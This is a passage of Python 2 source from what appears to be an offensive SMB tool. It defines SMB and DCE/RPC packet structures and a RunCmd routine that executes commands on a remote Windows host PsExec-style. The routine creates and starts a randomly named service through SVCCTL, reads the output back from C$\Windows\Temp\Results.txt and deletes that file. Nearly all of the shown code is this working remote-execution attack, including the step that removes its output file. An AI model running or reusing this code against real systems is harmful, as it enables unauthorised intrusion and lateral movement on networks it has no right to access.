        ## Then convert to UTF-16LE, yeah it's weird..
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')
        self.fields["DisplayNameID"] = self.fields["DisplayNameID"].encode('utf-16le')
        self.fields["BinPathName"] = self.fields["BinPathName"].encode('utf-16le')
        self.fields["BinCMD"] = self.fields["BinCMD"].encode('utf-16le')
        self.fields["BintoEnd"] = self.fields["BintoEnd"].encode('utf-16le')

class SMBDCESVCCTLOpenService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x0c\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0c\x00\x00\x00"),
        ("ServiceName",          ""),
        ("MachineNameNull",      "\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
    ])

    def calculate(self):
        ## Calculate first
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        ## Then convert to UTF-16LE, yeah it's weird..
        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')

class SMBDCESVCCTLStartService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

class OpenAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x0f"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00" ),
        ("Andxoffset",            "\x00\x00"),
        ("Flags",                 "\x07\x00"),
        ("DesiredAccess",         "\xc2\x00"),
        ("SearchAttrib",          "\x16\x00"),
        ("FileAttrib",            "\x20\x00"),
        ("Created",               "\x40\x9d\xc1\x57"),
        ("OpenFunc",              "\x12\x00"),
        ("allocsize",             "\x00\x00\x00\x00"),
        ("Timeout",               "\x00\x00\x00\x00"),
        ("Reserved2",             "\x00\x00\x00\x00"),
        ("Bcc",                   "\x0b\x00"),
        ("Terminator",            ""),
        ("File",                  "\\hola.txt"),
        ("FileNull",              "\x00"),#00 00

    ])
    def calculate(self):
        #self.fields["File"] = self.fields["File"].encode('utf-16le')
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Terminator"])+str(self.fields["File"])+str(self.fields["FileNull"])))

class ReadRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x05"),
        ("FID",                   "\x02\x40"),
        ("Count",                 "\xf0\xff"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("RemainingBytes",        "\xf0\xff"),
        ("Bcc",                   "\x00\x00"),

    ])

class ReadRequestAndX(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x0C"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("AndXOffset",            "\xde\xde"),#
        ("FID",                   "\x02\x40"),
        ("Offset",                "\x00\x00\x00\x00"),
        ("MaxCountLow",           "\xf0\xff"),
        ("MinCount",              "\xf0\xff"),
        ("Timeout",               "\xff\xff\xff\xff"),
        ("RemainingBytes",        "\xf0\xff"),
        ("HighOffset",            "\x00\x00\x00\x00"),
        ("Bcc",                   "\x00\x00"),

    ])


class CloseRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x03"),
        ("FID",                   "\x00\x00"),
        ("LastWrite",             "\xff\xff\xff\xff"),
        ("Bcc",                   "\x00\x00"),

    ])

class DeleteFileRequest(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x01"),
        ("SearchAttributes",      "\x06\x00"),
        ("Bcc",                   "\x1b\x00"),
        ("BuffType",              "\x04"),
        ("File",                  ""),
        ("FileNull",              "\x00\x00"),

    ])
    def calculate(self):
        self.fields["File"] = self.fields["File"].encode('utf-16le')
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["BuffType"])+str(self.fields["File"])+str(self.fields["FileNull"])))

class SMBEcho(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x01"),
        ("EchoCount",             "\x01\x00"),
        ("Bcc",                   "\x1b\x00"),
        ("File",                  "LWO CW VLO DEO MAW LMW ARW"),#nt4 style.
        ("FileNull",              "\x00"),

    ])

###########################PSEXEC#############################################

def ExtractCommandOutput(data):
    DataLen = struct.unpack("<H", data[61:63])[0]
    Output = data[63:63+DataLen]
    return Output

def SMBReadRecv(s):
    Completedata=[]
    data=''
    Start=time.time()
    s.setblocking(0)
    while 1:
        if Completedata and time.time()-Start > 0.5:#Timeout
            break
        try:
            data = s.recv(1024)
            if data:
                Completedata.append(data)
                Start=time.time()
            else:
                break
        except:
            pass

    s.setblocking(1)
    return s, ''.join(Completedata)


def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
    if data == None:
        return False
    head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",mid="\x05\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBNTCreateData()
    t.calculate()
    packet0 = str(head)+str(t)
    buffer1 = longueur(packet0)+packet0
    s.send(buffer1)
    data = s.recv(2048)

    ## Fail Handling.
    if data[8:10] == "\xa2\x22":
        print "[+] NT_CREATE denied. SMB Signing mandatory or this user has no privileges on this workstation.\n"
        return False

    ## DCE/RPC Write.
    if data[8:10] == "\xa2\x00":
        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        x = SMBDCEData()
        x.calculate()
        f = data[42:44]
        t = SMBWriteData(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ## DCE/RPC Read.
    if data[8:10] == "\x2f\x00":
            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBReadData(FID=f)
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)
            ## DCE/RPC SVCCTLOpenManagerW.
            if data[8:10] == "\x2e\x00":
                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x03\x00")#, MachineName="\\\\"+Host[0])
                w.calculate()
                x = SMBDCEPacketData(Data=w)
                x.calculate()
                t = SMBWriteData(FID=f,Data=x)
                t.calculate()
                packet0 = str(head)+str(t)
                buffer1 = longueur(packet0)+packet0
                s.send(buffer1)
                data = s.recv(2048)
                ## DCE/RPC Read Answer.
                if data[8:10] == "\x2f\x00":
                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                    t = SMBReadData(FID=f)
                    t.calculate()
                    packet0 = str(head)+str(t)
                    buffer1 = longueur(packet0)+packet0
                    s.send(buffer1)
                    data = s.recv(2048)
                    ## DCE/RPC SVCCTLCreateService.
                    if data[8:10] == "\x2e\xb0":
                       print "[+] Server returned NT_STATUS_PIPE_DISCONNECTED, no admin rights on that pipe.\n"
                       return False
                    ## DCE/RPC SVCCTLCreateService.
                    if data[8:10] == "\x2e\x00":
                        if data[len(data)-4:] == "\x05\x00\x00\x00":
                            print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n"
                            return False
                        #print "[+] Creating service"
                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                        ContextHandler = data[88:108]
                        ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
                        ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
                        FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
                        FilePath = FileChars
                        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars, FileName=FilePath, ReferentID="\x21\x03\x03\x00",BinCMD=Command)
                        w.calculate()
                        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
                        x.calculate()
                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                        t.calculate()
                        packet0 = str(head)+str(t)
                        buffer1 = longueur(packet0)+packet0
                        s.send(buffer1)
                        data = s.recv(2048)
                        ## DCE/RPC Read Answer.
                        if data[8:10] == "\x2f\x00":
                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                            t.calculate()
                            packet0 = str(head)+str(t)
                            buffer1 = longueur(packet0)+packet0
                            s.send(buffer1)
                            data = s.recv(2048)
                            ## DCE/RPC SVCCTLOpenService.
                            if data[8:10] == "\x2e\x00":
                                if data[len(data)-4:] == "\x05\x00\x00\x00":
                                    print "[+] Failed to create the service\n"
                                    return False
                                #print "[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars)
                                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0c\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
                                w.calculate()
                                x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
                                x.calculate()
                                t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                                t.calculate()
                                packet0 = str(head)+str(t)
                                buffer1 = longueur(packet0)+packet0
                                s.send(buffer1)
                                data = s.recv(2048)
                                ## DCE/RPC Read Answer.
                                if data[8:10] == "\x2f\x00":
                                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0d\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                    t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                                    t.calculate()
                                    packet0 = str(head)+str(t)
                                    buffer1 = longueur(packet0)+packet0
                                    s.send(buffer1)
                                    data = s.recv(2048)
                                    ## DCE/RPC SVCCTLStartService.
                                    if data[8:10] == "\x2e\x00":
                                        if data[len(data)-4:] == "\x05\x00\x00\x00":
                                            print "[+] Failed to open the service.\n"
                                            return False
                                        ContextHandler = data[88:108]
                                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0e\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
                                        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
                                        x.calculate()
                                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                                        t.calculate()
                                        packet0 = str(head)+str(t)
                                        buffer1 = longueur(packet0)+packet0
                                        s.send(buffer1)
                                        data = s.recv(2048)
                                        ## DCE/RPC Read Answer.
                                        if data[8:10] == "\x2f\x00":
                                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0f\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                                            t.calculate()
                                            packet0 = str(head)+str(t)
                                            buffer1 = longueur(packet0)+packet0
                                            s.send(buffer1)
                                            data = s.recv(2048)


    ##Tree connect c$
    if data[8:10] == "\x2e\x00":
       #print "[+] Command executed, grabbing output now."
       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)
       #time.sleep(1)#Maybe the command executed took some time..
       #print "[+] Removing service.\n[+] Cleaning up files.\n"
       head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
       t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\C$")
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1
       s.send(buffer1)
       data = s.recv(2048)
       ##OpenAndX.
       if data[8:10] == "\x75\x00":
          head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
          t = OpenAndX(File="\\Windows\\Temp\\Results.txt", OpenFunc="\x01\x00")
          t.calculate()
          packet1 = str(head)+str(t)
          buffer1 = longueur(packet1)+packet1  
          s.send(buffer1)
          data = s.recv(2048)
          ##OpenAndX.
          if data[8:10] == "\x2d\x34":
             time.sleep(1)#not found, maybe still processing the cmd. Wait a bit.
             head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
             t = OpenAndX(File="\\Windows\\Temp\\Results.txt", OpenFunc="\x01\x00")
             t.calculate()
             packet1 = str(head)+str(t)
             buffer1 = longueur(packet1)+packet1  
             s.send(buffer1)
             data = s.recv(2048)
          ##OpenAndX.
          if data[8:10] == "\x2d\x34":
             time.sleep(1)#not found, command failed.
             print "[+] The command failed."
             return data
    ##ReadRequest.
    ## Need grab the size from Open And X and do it properly later. For now, only 65535 bytes printed.
    if data[8:10] == "\x2d\x00":
       ReturnedFID = data[41:43]
       head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
       t = ReadRequestAndX(FID=ReturnedFID)
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       s, data = SMBReadRecv(s)
       #print "[+] Output:\n"
       print ExtractCommandOutput(data)

       ##Close Request
       if data[8:10] == "\x2e\x00":
          head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
          t = CloseRequest(FID = ReturnedFID)
          packet1 = str(head)+str(t)
          buffer1 = longueur(packet1)+packet1  
          s.send(buffer1)
          data = s.recv(2048)

    ##DeleteFileRequest.
    if data[8:10] == "\x04\x00":
       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
       t = DeleteFileRequest(File="\\Windows\\Temp\\Results.txt")
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       #print "[+] Deleting file now."
       s.send(buffer1)
       data = s.recv(2048)

    if data[8:10] == "\x06\x00":
       #print "[+] File deleted, making sure it's not there anymore.." 
       head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
       t = OpenAndX(File="\\Windows\\Temp\\Results.txt", OpenFunc="\x01\x00")
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       s.send(buffer1)
       data = s.recv(2048)
       return data

